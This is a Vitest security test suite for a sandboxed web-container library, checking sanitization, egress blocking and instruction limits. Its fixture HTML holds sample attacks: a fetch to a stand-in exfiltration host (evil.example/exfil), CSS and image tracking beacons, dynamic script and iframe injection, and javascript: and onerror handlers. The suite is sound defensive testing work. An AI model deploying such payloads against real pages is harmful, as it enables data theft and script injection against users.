import { describe, it, expect, beforeEach } from 'vitest';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { mountSoftNContainer } from '../src/index';
import { ContainerArchive } from '../src/archive';
import { isExternalUrlAllowed, sanitizeHostAssetUrl } from '../src/sanitize';
import { transformContainerCss } from '../src/css-policy';

const PKG_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const LITE_WASM = path.join(PKG_ROOT, 'dist', 'runtime', 'engines', 'zipp-javascript-lite.wasm');

function flushAsync(ms = 35): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

describe('Container Sandbox Security, Egress Enforcement & Instruction Limits', () => {
  beforeEach(() => {
    localStorage.clear();
    document.body.innerHTML = '';
  });

  it('strips <script>/<iframe>/javascript:/external CSS urls and blocks dynamic script/iframe injection', async () => {
    (globalThis as Record<string, unknown>).__HOST_PWNED__ = false;

    const host = document.createElement('div');
    document.body.appendChild(host);

    const handle = await mountSoftNContainer(host, {
      isolation: 'inline',
      engineWasm: { lite: LITE_WASM },
      source: {
        'index.html': `<!DOCTYPE html>
          <html>
          <head>
            <style>
              @import url("https://evil.example/steal.css");
              .leak { background-image: url("https://evil.example/beacon.png"); }
            </style>
          </head>
          <body>
            <iframe src="https://evil.example/frame"></iframe>
            <img id="bad-img" src="https://evil.example/track.png" onerror="window.__HOST_PWNED__ = true">
            <a id="bad-link" href="javascript:window.__HOST_PWNED__=true">Click</a>
            <div id="out"></div>
            <script>
              // Attempt to escape or inject <script> and <iframe> dynamically
              const s = document.createElement('script');
              s.textContent = 'window.__HOST_PWNED__ = true';
              document.body.appendChild(s);

              const f = document.createElement('iframe');
              f.src = 'https://evil.example';
              document.body.appendChild(f);

              // Attempt to read host secret or make unpermitted external fetch
              fetch('https://evil.example/exfil')
                .then(() => { document.getElementById('out').textContent = 'ALLOWED_BAD'; })
                .catch(() => { document.getElementById('out').textContent = 'BLOCKED_OK'; });
            </script>
          </body></html>`,
      },
    });

    await flushAsync(50);

    // Zero <script> or <iframe> elements exist in the host ShadowRoot
    expect(handle.shadowRoot.querySelector('script')).toBeNull();
    expect(handle.shadowRoot.querySelector('iframe')).toBeNull();
    expect((globalThis as Record<string, unknown>).__HOST_PWNED__).toBe(false);

    // Unpermitted remote image & javascript: href stripped
    expect(handle.shadowRoot.querySelector('#bad-img')?.getAttribute('src')).toBeNull();
    expect(handle.shadowRoot.querySelector('#bad-img')?.getAttribute('onerror')).toBeNull();
    expect(handle.shadowRoot.querySelector('#bad-link')?.getAttribute('href')).toBeNull();

    // CSS @import & external url() neutralized
    const cssText = handle.shadowRoot.querySelector('style')?.textContent ?? '';
    expect(cssText).not.toContain('evil.example');

    // External fetch rejected cleanly
    expect(handle.shadowRoot.querySelector('#out')?.textContent).toBe('BLOCKED_OK');

    handle.dispose();
  });

  it('halts runaway infinite loops via ZIPP instruction budget without freezing', async () => {
    const host = document.createElement('div');
    document.body.appendChild(host);

    const errors: Error[] = [];
    await expect(
      mountSoftNContainer(host, {
        isolation: 'inline',
        engineWasm: { lite: LITE_WASM },
        limits: { instructionsPerTurn: 200_000 },
        onError: (e) => errors.push(e),
        source: {
          'index.html': `<!DOCTYPE html>
            <html><body>
              <script>
                while (true) {}
              </script>
            </body></html>`,
        },
      })
    ).rejects.toThrow();

    expect(errors.length).toBeGreaterThan(0);
  });

  it('blocks embedding host origin under wildcard egress, strips appearance:base-select and remote <use href>', async () => {
    // Broad wildcard net permission must not implicitly grant access to the embedding host origin.
    const hostOrigin = window.location.origin;
    const wildcardNet = { enabled: true, allowed_hosts: ['*'], allow_http: true };
    expect(isExternalUrlAllowed(`${hostOrigin}/api/admin`, wildcardNet, true)).toBe(false);
    // Single-label intranet hostnames and .lan/.corp suffixes are rejected as private/local.
    expect(isExternalUrlAllowed('https://intranet/secret', wildcardNet, true)).toBe(false);
    expect(isExternalUrlAllowed('https://printer.lan/status', wildcardNet, true)).toBe(false);
    expect(isExternalUrlAllowed('https://api.public-example.org/v1', wildcardNet, true)).toBe(true);

    // SVG <use href> only allows local fragment references.
    const archive = await ContainerArchive.open({ 'index.html': '<svg></svg>' });
    const perms = { permissions: { net: wildcardNet } };
    expect(sanitizeHostAssetUrl('href', '#icon-home', 'use', 'index.html', archive, perms, true)).toBe('#icon-home');
    expect(sanitizeHostAssetUrl('href', 'https://evil.example/sprite.svg#x', 'use', 'index.html', archive, perms, true)).toBeNull();
    expect(sanitizeHostAssetUrl('xlink:href', 'data:image/svg+xml,<svg/>', 'use', 'index.html', archive, perms, true)).toBeNull();
    archive.dispose();

    // CSS appearance: base-select / base-picker / var(...) are stripped to prevent top-layer clickjacking.
    const css = transformContainerCss(
      'select { appearance: base-select; -webkit-appearance: base-picker; color: blue; } .x { appearance: var(--a); }',
      { scopeSelectors: false, rewriteViewportUnits: false }
    );
    expect(css).not.toMatch(/base-select|base-picker|var\(--a\)/i);
    expect(css).toContain('color: blue');
  });
});
